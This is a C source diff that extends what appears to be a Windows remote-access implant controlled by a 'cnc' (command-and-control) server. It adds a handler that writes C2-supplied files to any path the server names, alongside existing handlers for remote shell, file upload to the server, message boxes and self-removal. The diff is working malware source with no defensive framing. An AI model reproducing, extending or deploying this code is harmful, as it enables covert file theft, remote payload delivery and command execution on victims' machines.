@@ -165,7 +165,7 @@ void handle_upload_file()
         return;
     }
     cmd.local_path[cmd.local_path_len] = 0;
-    log_debug("local path: %s", cmd.local_path);
+    log_info("Uploading file to: %s", cmd.local_path);
 
     file = CreateFile(cmd.local_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     free(cmd.local_path);
@@ -182,7 +182,6 @@ void handle_upload_file()
         return;
 
     cmd.file_size = GetFileSize(file, NULL);
-    log_debug("file size: %u", cmd.file_size);
     if (cmd.file_size == INVALID_FILE_SIZE)
         fatal_error("Failed to get the file's size.");
     bytes_read = send_cnc(&cmd.file_size, sizeof(cmd.file_size));
@@ -191,7 +190,8 @@ void handle_upload_file()
 
     while (TRUE)
     {
-        ret = ReadFile(file, cmd.file_chunk, sizeof(cmd.file_chunk), &bytes_read, NULL);
+        if (!ReadFile(file, cmd.file_chunk, sizeof(cmd.file_chunk), &bytes_read, NULL))
+            fatal_error("Failed to read from file.");
         if (!bytes_read)
         {
             CloseHandle(file);
@@ -202,11 +202,79 @@ void handle_upload_file()
     }
 }
 
+void handle_download_file()
+{
+    int ret;
+    unsigned long bytes_read, bytes_to_read;
+    unsigned long long written_file_bytes = 0;
+    HANDLE file;
+    struct file_cmd cmd;
+
+    log_info("Received DOWNLOAD_FILE command.");
+
+    bytes_read = recv_cnc(&cmd.local_path_len, sizeof(cmd.local_path_len));
+    if (bytes_read != sizeof(cmd.local_path_len))
+    {
+        log_error("Failed to read file path length.");
+        return;
+    }
+    cmd.local_path = malloc(cmd.local_path_len + 1);
+    if (!cmd.local_path)
+    {
+        log_error("Failed to allocate memory for file path.");
+        return;
+    }
+
+    bytes_read = recv_cnc(cmd.local_path, cmd.local_path_len);
+    if (bytes_read != cmd.local_path_len)
+    {
+        log_error("Failed to read local file path.");
+        return;
+    }
+    cmd.local_path[cmd.local_path_len] = 0;
+    log_info("Downloading file to: %s", cmd.local_path);
+
+    file = CreateFile(cmd.local_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    free(cmd.local_path);
+    if (file == INVALID_HANDLE_VALUE)
+        ret = GetLastError();
+    else
+        ret = 0;
+
+    bytes_read = send_cnc(&ret, sizeof(ret));
+    if (bytes_read != sizeof(ret))
+        fatal_error("Failed to send return code of CreateFile.");
+
+    if (ret)
+        return;
+
+    bytes_read = recv_cnc(&cmd.file_size, sizeof(cmd.file_size));
+    if (bytes_read != sizeof(cmd.file_size))
+        fatal_error("Failed to read file size.");
+
+    log_debug("File size: %u", cmd.file_size);
+    while (TRUE)
+    {
+        bytes_to_read = min(sizeof(cmd.file_chunk), cmd.file_size - written_file_bytes);
+        bytes_read = recv_cnc(cmd.file_chunk, bytes_to_read);
+        written_file_bytes += bytes_read;
+
+        if (!WriteFile(file, cmd.file_chunk, bytes_read, NULL, NULL))
+            fatal_error("Failed to write to file.");
+
+        if (written_file_bytes == cmd.file_size)
+        {
+            CloseHandle(file);
+            return;
+        }
+    }
+}
+
 void listen_for_cmds()
 {
     int bytes_read;
     struct cmd cmd;
-    void (*cmd_type_handler[])() = {handle_echo, handle_shell, handle_msgbox, handle_suicide, handle_upload_file};
+    void (*cmd_type_handler[])() = {handle_echo, handle_shell, handle_msgbox, handle_suicide, handle_upload_file, handle_download_file};
 
     while (TRUE)
     {
